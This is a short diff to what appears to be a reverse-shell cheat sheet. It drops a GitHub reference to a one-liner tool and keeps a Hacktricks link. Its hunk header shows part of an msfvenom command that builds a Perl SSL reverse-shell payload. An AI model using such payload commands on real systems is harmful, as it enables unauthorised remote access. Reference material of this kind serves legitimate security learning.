@@ -19,10 +19,6 @@ $ msfvenom -p cmd/unix/reverse_perl_ssl handlersslcert=[/path/to/file.pem] sslve
 ---
 ## References
 
-### Github
-
-- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
-
 ### Hacktricks
 
 - [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
